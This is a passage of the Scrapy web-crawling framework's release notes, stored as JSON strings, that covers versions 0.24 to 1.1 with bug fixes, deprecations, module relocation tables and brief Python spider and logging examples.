:issue:`1727`, :issue:`1879`).\n- Other refactoring, optimizations and cleanup (:issue:`1476`, :issue:`1481`,\n  :issue:`1477`, :issue:`1315`, :issue:`1290`, :issue:`1750`, :issue:`1881`).\n\n.. _`Code of Conduct`: https://github.com/scrapy/scrapy/blob/master/CODE_OF_CONDUCT.md\n\n\nDeprecations and Removals\n~~~~~~~~~~~~~~~~~~~~~~~~~\n\n- Added ``to_bytes`` and ``to_unicode``, deprecated ``str_to_unicode`` and\n  ``unicode_to_str`` functions (:issue:`778`).\n- ``binary_is_text`` is introduced, to replace use of ``isbinarytext``\n  (but with inverse return value) (:issue:`1851`)\n- The ``optional_features`` set has been removed (:issue:`1359`).\n- The ``--lsprof`` command line option has been removed (:issue:`1689`).\n  **Warning: backward incompatible**, but doesn't break user code.\n- The following datatypes were deprecated (:issue:`1720`):\n\n  + ``scrapy.utils.datatypes.MultiValueDictKeyError``\n  + ``scrapy.utils.datatypes.MultiValueDict``\n  + ``scrapy.utils.datatypes.SiteNode``\n\n- The previously bundled ``scrapy.xlib.pydispatch`` library was deprecated and\n  replaced by `pydispatcher <https://pypi.org/project/PyDispatcher/>`_.\n\n\nRelocations\n~~~~~~~~~~~\n\n- ``telnetconsole`` was relocated to ``extensions/`` (:issue:`1524`).\n\n  + Note: telnet is not enabled on Python 3\n    (https://github.com/scrapy/scrapy/pull/1524#issuecomment-146985595)\n\n\nBugfixes\n~~~~~~~~\n\n- Scrapy does not retry requests that got a ``HTTP 400 Bad Request``\n  response anymore (:issue:`1289`). **Warning: backward incompatible!**\n- Support empty password for http_proxy config (:issue:`1274`).\n- Interpret ``application/x-json`` as ``TextResponse`` (:issue:`1333`).\n- Support link rel attribute with multiple values (:issue:`1201`).\n- Fixed ``scrapy.http.FormRequest.from_response`` when there is a ``<base>``\n  tag (:issue:`1564`).\n- Fixed :setting:`TEMPLATES_DIR` handling (:issue:`1575`).\n- Various ``FormRequest`` fixes (:issue:`1595`, :issue:`1596`, :issue:`1597`).\n- Makes ``_monkeypatches`` more robust (:issue:`1634`).\n- Fixed bug on ``XMLItemExporter`` with non-string fields in\n  items (:issue:`1738`).\n- Fixed startproject command in macOS (:issue:`1635`).\n- Fixed :class:`~scrapy.exporters.PythonItemExporter` and CSVExporter for\n  non-string item types (:issue:`1737`).\n- Various logging related fixes (:issue:`1294`, :issue:`1419`, :issue:`1263`,\n  :issue:`1624`, :issue:`1654`, :issue:`1722`, :issue:`1726` and :issue:`1303`).\n- Fixed bug in ``utils.template.render_templatefile()`` (:issue:`1212`).\n- sitemaps extraction from ``robots.txt`` is now case-insensitive (:issue:`1902`).\n- HTTPS+CONNECT tunnels could get mixed up when using multiple proxies\n  to same remote host (:issue:`1912`).\n\n.. _release-1.0.7:\n\n", "1.0.7": "-------------------------\n\n- Packaging fix: disallow unsupported Twisted versions in setup.py\n\n.. _release-1.0.6:\n\n", "1.0.6": "-------------------------\n\n- FIX: RetryMiddleware is now robust to non-standard HTTP status codes (:issue:`1857`)\n- FIX: Filestorage HTTP cache was checking wrong modified time (:issue:`1875`)\n- DOC: Support for Sphinx 1.4+ (:issue:`1893`)\n- DOC: Consistency in selectors examples (:issue:`1869`)\n\n.. _release-1.0.5:\n\n", "1.0.5": "-------------------------\n\n- FIX: [Backport] Ignore bogus links in LinkExtractors (fixes :issue:`907`, :commit:`108195e`)\n- TST: Changed buildbot makefile to use 'pytest' (:commit:`1f3d90a`)\n- DOC: Fixed typos in tutorial and media-pipeline (:commit:`808a9ea` and :commit:`803bd87`)\n- DOC: Add AjaxCrawlMiddleware to DOWNLOADER_MIDDLEWARES_BASE in settings docs (:commit:`aa94121`)\n\n.. _release-1.0.4:\n\n", "1.0.4": "-------------------------\n\n- Ignoring xlib/tx folder, depending on Twisted version. (:commit:`7dfa979`)\n- Run on new travis-ci infra (:commit:`6e42f0b`)\n- Spelling fixes (:commit:`823a1cc`)\n- escape nodename in xmliter regex (:commit:`da3c155`)\n- test xml nodename with dots (:commit:`4418fc3`)\n- TST don't use broken Pillow version in tests (:commit:`a55078c`)\n- disable log on version command. closes 1426 (:commit:`86fc330`)\n- disable log on startproject command (:commit:`db4c9fe`)\n- Add PyPI download stats badge (:commit:`df2b944`)\n- don't run tests twice on Travis if a PR is made from a scrapy/scrapy branch (:commit:`a83ab41`)\n- Add Python 3 porting status badge to the README (:commit:`73ac80d`)\n- fixed RFPDupeFilter persistence (:commit:`97d080e`)\n- TST a test to show that dupefilter persistence is not working (:commit:`97f2fb3`)\n- explicit close file on file:// scheme handler (:commit:`d9b4850`)\n- Disable dupefilter in shell (:commit:`c0d0734`)\n- DOC: Add captions to toctrees which appear in sidebar (:commit:`aa239ad`)\n- DOC Removed pywin32 from install instructions as it's already declared as dependency. (:commit:`10eb400`)\n- Added installation notes about using Conda for Windows and other OSes. (:commit:`1c3600a`)\n- Fixed minor grammar issues. (:commit:`7f4ddd5`)\n- fixed a typo in the documentation. (:commit:`b71f677`)\n- Version 1 now exists (:commit:`5456c0e`)\n- fix another invalid xpath error (:commit:`0a1366e`)\n- fix ValueError: Invalid XPath: //div/[id=\"not-exists\"]/text() on selectors.rst (:commit:`ca8d60f`)\n- Typos corrections (:commit:`7067117`)\n- fix typos in downloader-middleware.rst and exceptions.rst, middlware -> middleware (:commit:`32f115c`)\n- Add note to Ubuntu install section about Debian compatibility (:commit:`23fda69`)\n- Replace alternative macOS install workaround with virtualenv (:commit:`98b63ee`)\n- Reference Homebrew's homepage for installation instructions (:commit:`1925db1`)\n- Add oldest supported tox version to contributing docs (:commit:`5d10d6d`)\n- Note in install docs about pip being already included in python>=2.7.9 (:commit:`85c980e`)\n- Add non-python dependencies to Ubuntu install section in the docs (:commit:`fbd010d`)\n- Add macOS installation section to docs (:commit:`d8f4cba`)\n- DOC(ENH): specify path to rtd theme explicitly (:commit:`de73b1a`)\n- minor: scrapy.Spider docs grammar (:commit:`1ddcc7b`)\n- Make common practices sample code match the comments (:commit:`1b85bcf`)\n- nextcall repetitive calls (heartbeats). (:commit:`55f7104`)\n- Backport fix compatibility with Twisted 15.4.0 (:commit:`b262411`)\n- pin pytest to 2.7.3 (:commit:`a6535c2`)\n- Merge pull request 1512 from mgedmin/patch-1 (:commit:`8876111`)\n- Merge pull request 1513 from mgedmin/patch-2 (:commit:`5d4daf8`)\n- Typo (:commit:`f8d0682`)\n- Fix list formatting (:commit:`5f83a93`)\n- fix Scrapy squeue tests after recent changes to queuelib (:commit:`3365c01`)\n- Merge pull request 1475 from rweindl/patch-1 (:commit:`2d688cd`)\n- Update tutorial.rst (:commit:`fbc1f25`)\n- Merge pull request 1449 from rhoekman/patch-1 (:commit:`7d6538c`)\n- Small grammatical change (:commit:`8752294`)\n- Add openssl version to version command (:commit:`13c45ac`)\n\n.. _release-1.0.3:\n\n", "1.0.3": "-------------------------\n\n- add service_identity to Scrapy install_requires (:commit:`cbc2501`)\n- Workaround for travis296 (:commit:`66af9cd`)\n\n.. _release-1.0.2:\n\n", "1.0.2": "-------------------------\n\n- Twisted 15.3.0 does not raises PicklingError serializing lambda functions (:commit:`b04dd7d`)\n- Minor method name fix (:commit:`6f85c7f`)\n- minor: scrapy.Spider grammar and clarity (:commit:`9c9d2e0`)\n- Put a blurb about support channels in CONTRIBUTING (:commit:`c63882b`)\n- Fixed typos (:commit:`a9ae7b0`)\n- Fix doc reference. (:commit:`7c8a4fe`)\n\n.. _release-1.0.1:\n\n", "1.0.1": "-------------------------\n\n- Unquote request path before passing to FTPClient, it already escape paths (:commit:`cc00ad2`)\n- include tests/ to source distribution in MANIFEST.in (:commit:`eca227e`)\n- DOC Fix SelectJmes documentation (:commit:`b8567bc`)\n- DOC Bring Ubuntu and Archlinux outside of Windows subsection (:commit:`392233f`)\n- DOC remove version suffix from Ubuntu package (:commit:`5303c66`)\n- DOC Update release date for 1.0 (:commit:`c89fa29`)\n\n.. _release-1.0.0:\n\n", "1.0.0": "-------------------------\n\nYou will find a lot of new features and bugfixes in this major release.  Make\nsure to check our updated :ref:`overview <intro-overview>` to get a glance of\nsome of the changes, along with our brushed :ref:`tutorial <intro-tutorial>`.\n\nSupport for returning dictionaries in spiders\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nDeclaring and returning Scrapy Items is no longer necessary to collect the\nscraped data from your spider, you can now return explicit dictionaries\ninstead.\n\n*Classic version*\n\n::\n\n    class MyItem(scrapy.Item):\n        url = scrapy.Field()\n\n    class MySpider(scrapy.Spider):\n        def parse(self, response):\n            return MyItem(url=response.url)\n\n*New version*\n\n::\n\n    class MySpider(scrapy.Spider):\n        def parse(self, response):\n            return {'url': response.url}\n\nPer-spider settings (GSoC 2014)\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nLast Google Summer of Code project accomplished an important redesign of the\nmechanism used for populating settings, introducing explicit priorities to\noverride any given setting. As an extension of that goal, we included a new\nlevel of priority for settings that act exclusively for a single spider,\nallowing them to redefine project settings.\n\nStart using it by defining a :attr:`~scrapy.spiders.Spider.custom_settings`\nclass variable in your spider::\n\n    class MySpider(scrapy.Spider):\n        custom_settings = {\n            \"DOWNLOAD_DELAY\": 5.0,\n            \"RETRY_ENABLED\": False,\n        }\n\nRead more about settings population: :ref:`topics-settings`\n\nPython Logging\n~~~~~~~~~~~~~~\n\nScrapy 1.0 has moved away from Twisted logging to support Python built in\u2019s\nas default logging system. We\u2019re maintaining backward compatibility for most\nof the old custom interface to call logging functions, but you\u2019ll get\nwarnings to switch to the Python logging API entirely.\n\n*Old version*\n\n::\n\n    from scrapy import log\n    log.msg('MESSAGE', log.INFO)\n\n*New version*\n\n::\n\n    import logging\n    logging.info('MESSAGE')\n\nLogging with spiders remains the same, but on top of the\n:meth:`~scrapy.spiders.Spider.log` method you\u2019ll have access to a custom\n:attr:`~scrapy.spiders.Spider.logger` created for the spider to issue log\nevents:\n\n::\n\n    class MySpider(scrapy.Spider):\n        def parse(self, response):\n            self.logger.info('Response received')\n\nRead more in the logging documentation: :ref:`topics-logging`\n\nCrawler API refactoring (GSoC 2014)\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nAnother milestone for last Google Summer of Code was a refactoring of the\ninternal API, seeking a simpler and easier usage. Check new core interface\nin: :ref:`topics-api`\n\nA common situation where you will face these changes is while running Scrapy\nfrom scripts. Here\u2019s a quick example of how to run a Spider manually with the\nnew API:\n\n::\n\n    from scrapy.crawler import CrawlerProcess\n\n    process = CrawlerProcess({\n        'USER_AGENT': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)'\n    })\n    process.crawl(MySpider)\n    process.start()\n\nBear in mind this feature is still under development and its API may change\nuntil it reaches a stable status.\n\nSee more examples for scripts running Scrapy: :ref:`topics-practices`\n\n.. _module-relocations:\n\nModule Relocations\n~~~~~~~~~~~~~~~~~~\n\nThere\u2019s been a large rearrangement of modules trying to improve the general\nstructure of Scrapy. Main changes were separating various subpackages into\nnew projects and dissolving both ``scrapy.contrib`` and ``scrapy.contrib_exp``\ninto top level packages. Backward compatibility was kept among internal\nrelocations, while importing deprecated modules expect warnings indicating\ntheir new place.\n\nFull list of relocations\n************************\n\nOutsourced packages\n\n.. note::\n    These extensions went through some minor changes, e.g. some setting names\n    were changed. Please check the documentation in each new repository to\n    get familiar with the new usage.\n\n+-------------------------------------+-------------------------------------+\n| Old location                        | New location                        |\n+=====================================+=====================================+\n| scrapy.commands.deploy              | `scrapyd-client <https://github.com |\n|                                     | /scrapy/scrapyd-client>`_           |\n|                                     | (See other alternatives here:       |\n|                                     | :ref:`topics-deploy`)               |\n+-------------------------------------+-------------------------------------+\n| scrapy.contrib.djangoitem           | `scrapy-djangoitem <https://github. |\n|                                     | com/scrapy-plugins/scrapy-djangoite |\n|                                     | m>`_                                |\n+-------------------------------------+-------------------------------------+\n| scrapy.webservice                   | `scrapy-jsonrpc <https://github.com |\n|                                     | /scrapy-plugins/scrapy-jsonrpc>`_   |\n+-------------------------------------+-------------------------------------+\n\n``scrapy.contrib_exp`` and ``scrapy.contrib`` dissolutions\n\n+-------------------------------------+-------------------------------------+\n| Old location                        | New location                        |\n+=====================================+=====================================+\n| scrapy.contrib\\_exp.downloadermidd\\ | scrapy.downloadermiddlewares.decom\\ |\n| leware.decompression                | pression                            |\n+-------------------------------------+-------------------------------------+\n| scrapy.contrib\\_exp.iterators       | scrapy.utils.iterators              |\n+-------------------------------------+-------------------------------------+\n| scrapy.contrib.downloadermiddleware | scrapy.downloadermiddlewares        |\n+-------------------------------------+-------------------------------------+\n| scrapy.contrib.exporter             | scrapy.exporters                    |\n+-------------------------------------+-------------------------------------+\n| scrapy.contrib.linkextractors       | scrapy.linkextractors               |\n+-------------------------------------+-------------------------------------+\n| scrapy.contrib.loader               | scrapy.loader                       |\n+-------------------------------------+-------------------------------------+\n| scrapy.contrib.loader.processor     | scrapy.loader.processors            |\n+-------------------------------------+-------------------------------------+\n| scrapy.contrib.pipeline             | scrapy.pipelines                    |\n+-------------------------------------+-------------------------------------+\n| scrapy.contrib.spidermiddleware     | scrapy.spidermiddlewares            |\n+-------------------------------------+-------------------------------------+\n| scrapy.contrib.spiders              | scrapy.spiders                      |\n+-------------------------------------+-------------------------------------+\n| * scrapy.contrib.closespider        | scrapy.extensions.\\*                |\n| * scrapy.contrib.corestats          |                                     |\n| * scrapy.contrib.debug              |                                     |\n| * scrapy.contrib.feedexport         |                                     |\n| * scrapy.contrib.httpcache          |                                     |\n| * scrapy.contrib.logstats           |                                     |\n| * scrapy.contrib.memdebug           |                                     |\n| * scrapy.contrib.memusage           |                                     |\n| * scrapy.contrib.spiderstate        |                                     |\n| * scrapy.contrib.statsmailer        |                                     |\n| * scrapy.contrib.throttle           |                                     |\n+-------------------------------------+-------------------------------------+\n\nPlural renames and Modules unification\n\n+-------------------------------------+-------------------------------------+\n| Old location                        | New location                        |\n+=====================================+=====================================+\n| scrapy.command                      | scrapy.commands                     |\n+-------------------------------------+-------------------------------------+\n| scrapy.dupefilter                   | scrapy.dupefilters                  |\n+-------------------------------------+-------------------------------------+\n| scrapy.linkextractor                | scrapy.linkextractors               |\n+-------------------------------------+-------------------------------------+\n| scrapy.spider                       | scrapy.spiders                      |\n+-------------------------------------+-------------------------------------+\n| scrapy.squeue                       | scrapy.squeues                      |\n+-------------------------------------+-------------------------------------+\n| scrapy.statscol                     | scrapy.statscollectors              |\n+-------------------------------------+-------------------------------------+\n| scrapy.utils.decorator              | scrapy.utils.decorators             |\n+-------------------------------------+-------------------------------------+\n\nClass renames\n\n+-------------------------------------+-------------------------------------+\n| Old location                        | New location                        |\n+=====================================+=====================================+\n| scrapy.spidermanager.SpiderManager  | scrapy.spiderloader.SpiderLoader    |\n+-------------------------------------+-------------------------------------+\n\nSettings renames\n\n+-------------------------------------+-------------------------------------+\n| Old location                        | New location                        |\n+=====================================+=====================================+\n| SPIDER\\_MANAGER\\_CLASS              | SPIDER\\_LOADER\\_CLASS               |\n+-------------------------------------+-------------------------------------+\n\nChangelog\n~~~~~~~~~\n\nNew Features and Enhancements\n\n- Python logging (:issue:`1060`, :issue:`1235`, :issue:`1236`, :issue:`1240`,\n  :issue:`1259`, :issue:`1278`, :issue:`1286`)\n- FEED_EXPORT_FIELDS option (:issue:`1159`, :issue:`1224`)\n- Dns cache size and timeout options (:issue:`1132`)\n- support namespace prefix in xmliter_lxml (:issue:`963`)\n- Reactor threadpool max size setting (:issue:`1123`)\n- Allow spiders to return dicts. (:issue:`1081`)\n- Add Response.urljoin() helper (:issue:`1086`)\n- look in ~/.config/scrapy.cfg for user config (:issue:`1098`)\n- handle TLS SNI (:issue:`1101`)\n- Selectorlist extract first (:issue:`624`, :issue:`1145`)\n- Added JmesSelect (:issue:`1016`)\n- add gzip compression to filesystem http cache backend (:issue:`1020`)\n- CSS support in link extractors (:issue:`983`)\n- httpcache dont_cache meta 19 689 (:issue:`821`)\n- add signal to be sent when request is dropped by the scheduler\n  (:issue:`961`)\n- avoid download large response (:issue:`946`)\n- Allow to specify the quotechar in CSVFeedSpider (:issue:`882`)\n- Add referer to \"Spider error processing\" log message (:issue:`795`)\n- process robots.txt once (:issue:`896`)\n- GSoC Per-spider settings (:issue:`854`)\n- Add project name validation (:issue:`817`)\n- GSoC API cleanup (:issue:`816`, :issue:`1128`, :issue:`1147`,\n  :issue:`1148`, :issue:`1156`, :issue:`1185`, :issue:`1187`, :issue:`1258`,\n  :issue:`1268`, :issue:`1276`, :issue:`1285`, :issue:`1284`)\n- Be more responsive with IO operations (:issue:`1074` and :issue:`1075`)\n- Do leveldb compaction for httpcache on closing (:issue:`1297`)\n\nDeprecations and Removals\n\n- Deprecate htmlparser link extractor (:issue:`1205`)\n- remove deprecated code from FeedExporter (:issue:`1155`)\n- a leftover for.15 compatibility (:issue:`925`)\n- drop support for CONCURRENT_REQUESTS_PER_SPIDER (:issue:`895`)\n- Drop old engine code (:issue:`911`)\n- Deprecate SgmlLinkExtractor (:issue:`777`)\n\nRelocations\n\n- Move exporters/__init__.py to exporters.py (:issue:`1242`)\n- Move base classes to their packages (:issue:`1218`, :issue:`1233`)\n- Module relocation (:issue:`1181`, :issue:`1210`)\n- rename SpiderManager to SpiderLoader (:issue:`1166`)\n- Remove djangoitem (:issue:`1177`)\n- remove scrapy deploy command (:issue:`1102`)\n- dissolve contrib_exp (:issue:`1134`)\n- Deleted bin folder from root, fixes 913 (:issue:`914`)\n- Remove jsonrpc based webservice (:issue:`859`)\n- Move Test cases under project root dir (:issue:`827`, :issue:`841`)\n- Fix backward incompatibility for relocated paths in settings\n  (:issue:`1267`)\n\nDocumentation\n\n- CrawlerProcess documentation (:issue:`1190`)\n- Favoring web scraping over screen scraping in the descriptions\n  (:issue:`1188`)\n- Some improvements for Scrapy tutorial (:issue:`1180`)\n- Documenting Files Pipeline together with Images Pipeline (:issue:`1150`)\n- deployment docs tweaks (:issue:`1164`)\n- Added deployment section covering scrapyd-deploy and shub (:issue:`1124`)\n- Adding more settings to project template (:issue:`1073`)\n- some improvements to overview page (:issue:`1106`)\n- Updated link in docs/topics/architecture.rst (:issue:`647`)\n- DOC reorder topics (:issue:`1022`)\n- updating list of Request.meta special keys (:issue:`1071`)\n- DOC document download_timeout (:issue:`898`)\n- DOC simplify extension docs (:issue:`893`)\n- Leaks docs (:issue:`894`)\n- DOC document from_crawler method for item pipelines (:issue:`904`)\n- Spider_error doesn't support deferreds (:issue:`1292`)\n- Corrections & Sphinx related fixes (:issue:`1220`, :issue:`1219`,\n  :issue:`1196`, :issue:`1172`, :issue:`1171`, :issue:`1169`, :issue:`1160`,\n  :issue:`1154`, :issue:`1127`, :issue:`1112`, :issue:`1105`, :issue:`1041`,\n  :issue:`1082`, :issue:`1033`, :issue:`944`, :issue:`866`, :issue:`864`,\n  :issue:`796`, :issue:`1260`, :issue:`1271`, :issue:`1293`, :issue:`1298`)\n\nBugfixes\n\n- Item multi inheritance fix (:issue:`353`, :issue:`1228`)\n- ItemLoader.load_item: iterate over copy of fields (:issue:`722`)\n- Fix Unhandled error in Deferred (RobotsTxtMiddleware) (:issue:`1131`,\n  :issue:`1197`)\n- Force to read DOWNLOAD_TIMEOUT as int (:issue:`954`)\n- scrapy.utils.misc.load_object should print full traceback (:issue:`902`)\n- Fix bug for \".local\" host name (:issue:`878`)\n- Fix for Enabled extensions, middlewares, pipelines info not printed\n  anymore (:issue:`879`)\n- fix dont_merge_cookies bad behaviour when set to false on meta\n  (:issue:`846`)\n\nPython 3 In Progress Support\n\n- disable scrapy.telnet if twisted.conch is not available (:issue:`1161`)\n- fix Python 3 syntax errors in ajaxcrawl.py (:issue:`1162`)\n- more python3 compatibility changes for urllib (:issue:`1121`)\n- assertItemsEqual was renamed to assertCountEqual in Python 3.\n  (:issue:`1070`)\n- Import unittest.mock if available. (:issue:`1066`)\n- updated deprecated cgi.parse_qsl to use six's parse_qsl (:issue:`909`)\n- Prevent Python 3 port regressions (:issue:`830`)\n- PY3: use MutableMapping for python 3 (:issue:`810`)\n- PY3: use six.BytesIO and six.moves.cStringIO (:issue:`803`)\n- PY3: fix xmlrpclib and email imports (:issue:`801`)\n- PY3: use six for robotparser and urlparse (:issue:`800`)\n- PY3: use six.iterkeys, six.iteritems, and tempfile (:issue:`799`)\n- PY3: fix has_key and use six.moves.configparser (:issue:`798`)\n- PY3: use six.moves.cPickle (:issue:`797`)\n- PY3 make it possible to run some tests in Python3 (:issue:`776`)\n\nTests\n\n- remove unnecessary lines from py3-ignores (:issue:`1243`)\n- Fix remaining warnings from pytest while collecting tests (:issue:`1206`)\n- Add docs build to travis (:issue:`1234`)\n- TST don't collect tests from deprecated modules. (:issue:`1165`)\n- install service_identity package in tests to prevent warnings\n  (:issue:`1168`)\n- Fix deprecated settings API in tests (:issue:`1152`)\n- Add test for webclient with POST method and no body given (:issue:`1089`)\n- py3-ignores.txt supports comments (:issue:`1044`)\n- modernize some of the asserts (:issue:`835`)\n- selector.__repr__ test (:issue:`779`)\n\nCode refactoring\n\n- CSVFeedSpider cleanup: use iterate_spider_output (:issue:`1079`)\n- remove unnecessary check from scrapy.utils.spider.iter_spider_output\n  (:issue:`1078`)\n- Pydispatch pep8 (:issue:`992`)\n- Removed unused 'load=False' parameter from walk_modules() (:issue:`871`)\n- For consistency, use ``job_dir`` helper in ``SpiderState`` extension.\n  (:issue:`805`)\n- rename \"sflo\" local variables to less cryptic \"log_observer\" (:issue:`775`)\n\n", "0.24.6": "--------------------------\n\n- encode invalid xpath with unicode_escape under PY2 (:commit:`07cb3e5`)\n- fix IPython shell scope issue and load IPython user config (:commit:`2c8e573`)\n- Fix small typo in the docs (:commit:`d694019`)\n- Fix small typo (:commit:`f92fa83`)\n- Converted sel.xpath() calls to response.xpath() in Extracting the data (:commit:`c2c6d15`)\n\n\n", "0.24.5": "--------------------------\n\n- Support new _getEndpoint Agent signatures on Twisted 15.0.0 (:commit:`540b9bc`)\n- DOC a couple more references are fixed (:commit:`b4c454b`)\n- DOC fix a reference (:commit:`e3c1260`)\n- t.i.b.ThreadedResolver is now a new-style class (:commit:`9e13f42`)\n- S3DownloadHandler: fix auth for requests with quoted paths/query params (:commit:`cdb9a0b`)\n- fixed the variable types in mailsender documentation (:commit:`bb3a848`)\n- Reset items_scraped instead of item_count (:commit:`edb07a4`)\n- Tentative attention message about what document to read for contributions (:commit:`7ee6f7a`)\n- mitmproxy 0.10.1 needs netlib 0.10.1 too (:commit:`874fcdd`)\n- pin mitmproxy 0.10.1 as >0.11 does not work with tests (:commit:`c6b21f0`)\n- Test the parse command locally instead of against an external url (:commit:`c3a6628`)\n- Patches Twisted issue while closing the connection pool on HTTPDownloadHandler (:commit:`d0bf957`)\n- Updates documentation on dynamic item classes. (:commit:`eeb589a`)\n- Merge pull request 943 from Lazar-T/patch-3 (:commit:`5fdab02`)\n- typo (:commit:`b0ae199`)\n- pywin32 is required by Twisted. closes 937 (:commit:`5cb0cfb`)\n- Update install.rst (:commit:`781286b`)\n- Merge pull request 928 from Lazar-T/patch-1 (:commit:`b415d04`)\n- comma instead of fullstop (:commit:`627b9ba`)\n- Merge pull request 885 from jsma/patch-1 (:commit:`de909ad`)\n- Update request-response.rst (:commit:`3f3263d`)\n- SgmlLinkExtractor - fix for parsing <area> tag with Unicode present (:commit:`49b40f0`)\n\n", "0.24.4": "--------------------------\n\n- pem file is used by mockserver and required by scrapy bench (:commit:`5eddc68`)\n- scrapy bench needs scrapy.tests* (:commit:`d6cb999`)\n\n", "0.24.3": "--------------------------\n\n- no need to waste travis-ci time on py3 for 0.24 (:commit:`8e080c1`)\n- Update installation docs (:commit:`1d0c096`)\n- There is a trove classifier for Scrapy framework! (:commit:`4c701d7`)\n- update other places where w3lib version is mentioned (:commit:`d109c13`)\n- Update w3lib requirement to 1.8.0 (:commit:`39d2ce5`)\n- Use w3lib.html.replace_entities() (remove_entities() is deprecated) (:commit:`180d3ad`)\n- set zip_safe=False (:commit:`a51ee8b`)\n- do not ship tests package (:commit:`ee3b371`)\n- scrapy.bat is not needed anymore (:commit:`c3861cf`)\n- Modernize setup.py (:commit:`362e322`)\n- headers can not handle non-string values (:commit:`94a5c65`)\n- fix ftp test cases (:commit:`a274a7f`)\n- The sum up of travis-ci builds are taking like 50min to complete (:commit:`ae1e2cc`)\n- Update shell.rst typo (:commit:`e49c96a`)\n- removes weird indentation in the shell results (:commit:`1ca489d`)\n- improved explanations, clarified blog post as source, added link for XPath string functions in the spec (:commit:`65c8f05`)\n- renamed UserTimeoutError and ServerTimeouterror 583 (:commit:`037f6ab`)\n- adding some xpath tips to selectors docs (:commit:`2d103e0`)\n- fix tests to account for https://github.com/scrapy/w3lib/pull/23 (:commit:`f8d366a`)\n- get_func_args maximum recursion fix 728 (:commit:`81344ea`)\n- Updated input/output processor example according to 560. (:commit:`f7c4ea8`)\n- Fixed Python syntax in tutorial. (:commit:`db59ed9`)\n- Add test case for tunneling proxy (:commit:`f090260`)\n- Bugfix for leaking Proxy-Authorization header to remote host when using tunneling (:commit:`d8793af`)\n- Extract links from XHTML documents with MIME-Type \"application/xml\" (:commit:`ed1f376`)\n- Merge pull request 793 from roysc/patch-1 (:commit:`91a1106`)\n- Fix typo in commands.rst (:commit:`743e1e2`)\n- better testcase for settings.overrides.setdefault (:commit:`e22daaf`)\n- Using CRLF as line marker according to http 1.1 definition (:commit:`5ec430b`)\n\n", "0.24.2": "--------------------------\n\n- Use a mutable mapping to proxy deprecated settings.overrides and settings.defaults attribute (:commit:`e5e8133`)\n- there is not support for python3 yet (:commit:`3cd6146`)\n- Update python compatible version set to Debian packages (:commit:`fa5d76b`)\n- DOC fix formatting in release notes (:commit:`c6a9e20`)\n\n", "0.24.1": "--------------------------\n\n- Fix deprecated CrawlerSettings and increase backward compatibility with\n  .defaults attribute (:commit:`8e3f20a`)\n\n\n", "0.24.0": "--------------------------\n\nEnhancements\n~~~~~~~~~~~~\n\n- Improve Scrapy top-level namespace (:issue:`494`, :issue:`684`)\n- Add selector shortcuts to responses (:issue:`554`, :issue:`690`)\n- Add new lxml based LinkExtractor to replace unmaintained SgmlLinkExtractor\n  (:issue:`559`, :issue:`761`, :issue:`763`)\n- Cleanup settings API - part of per-spider settings **GSoC project** (:issue:`737`)\n- Add UTF8 encoding header to templates (:issue:`688`, :issue:`762`)\n- Telnet console now binds to 127.0.0.1 by default (:issue:`699`)\n- Update Debian/Ubuntu install instructions (:issue:`509`, :issue:`549`)\n- Disable smart strings in lxml XPath evaluations (:issue:`535`)\n- Restore filesystem based cache as default for http\n  cache middleware (:issue:`541`, :issue:`500`, :issue:`571`)\n- Expose current crawler in Scrapy shell (:issue:`557`)\n- Improve testsuite comparing CSV and XML exporters (:issue:`570`)\n- New ``offsite/filtered`` and ``offsite/domains`` stats (:issue:`566`)\n- Support process_links as generator in CrawlSpider (:issue:`555`)\n- Verbose logging and new stats counters for DupeFilter (:issue:`553`)\n- Add a mimetype parameter to ``MailSender.send()`` (:issue:`602`)\n- Generalize file pipeline log messages (:issue:`622`)\n- Replace unencodeable codepoints with html entities in SGMLLinkExtractor (:issue:`565`)\n- Converted SEP documents to rst format (:issue:`629`, :issue:`630`,\n  :issue:`638`, :issue:`632`, :issue:`636`, :issue:`640`, :issue:`635`,\n  :issue:`634`, :issue:`639`, :issue:`637`, :issue:`631`, :issue:`633`,\n  :issue:`641`, :issue:`642`)\n- Tests and docs for clickdata's nr index in FormRequest (:issue:`646`, :issue:`645`)\n- Allow to disable a downloader handler just like any other component (:issue:`650`)\n- Log when a request is discarded after too many redirections (:issue:`654`)\n- Log error responses if they are not handled by spider callbacks\n  (:issue:`612`, :issue:`656`)\n- Add content-type check to http compression mw (:issue:`193`, :issue:`660`)\n- Run pypy tests using latest pypi from ppa (:issue:`674`)\n- Run test suite using pytest instead of trial (:issue:`679`)\n- Build docs and check for dead links in tox environment (:issue:`687`)\n- Make scrapy.version_info a tuple of integers (:issue:`681`, :issue:`692`)\n- Infer exporter's output format from filename extensions\n  (:issue:`546`, :issue:`659`, :issue:`760`)\n- Support case-insensitive domains in ``url_is_from_any_domain()`` (:issue:`693`)\n- Remove pep8 warnings in project and spider templates (:issue:`698`)\n- Tests and docs for ``request_fingerprint`` function (:issue:`597`)\n- Update SEP-19 for GSoC project ``per-spider settings`` (:issue:`705`)\n- Set exit code to non-zero when contracts fails (:issue:`727`)\n- Add a setting to control what class is instantiated as Downloader component\n  (:issue:`738`)\n- Pass response in ``item_dropped`` signal (:issue:`724`)\n- Improve ``scrapy check`` contracts command (:issue:`733`, :issue:`752`)\n- Document ``spider.closed()`` shortcut (:issue:`719`)\n- Document ``request_scheduled`` signal (:issue:`746`)\n- Add a note about reporting security issues (:issue:`697`)\n- Add LevelDB http cache storage backend (:issue:`626`, :issue:`500`)\n- Sort spider list output of ``scrapy list`` command (:issue:`742`)\n- Multiple documentation enhancements and fixes\n  (:issue:`575`, :issue:`587`, :issue:`590`, :issue:`596`, :issue:`610`,\n  :issue:`617`, :issue:`618`, :issue:`627`, :issue:`613`, :issue:`643`,\n  :issue:`654`, :issue:`675`, :issue:`663`, :issue:`711`, :issue:`714`)\n\nBugfixes\n~~~~~~~~\n\n- Encode unicode URL value when creating Links in RegexLinkExtractor (:issue:`561`)\n- Ignore None values in ItemLoader processors (:issue:`556`)\n- Fix link text when there is an inner tag in SGMLLinkExtractor and\n  HtmlParserLinkExtractor (:issue:`485`, :issue:`574`)\n- Fix wrong checks on subclassing of deprecated classes\n  (:issue:`581`, :issue:`584`)\n- Handle errors caused by inspect.stack() failures (:issue:`582`)\n- Fix a reference to unexistent engine attribute (:issue:`593`, :issue:`594`)\n- Fix dynamic itemclass example usage of type() (:issue:`603`)\n- Use lucasdemarchi/codespell 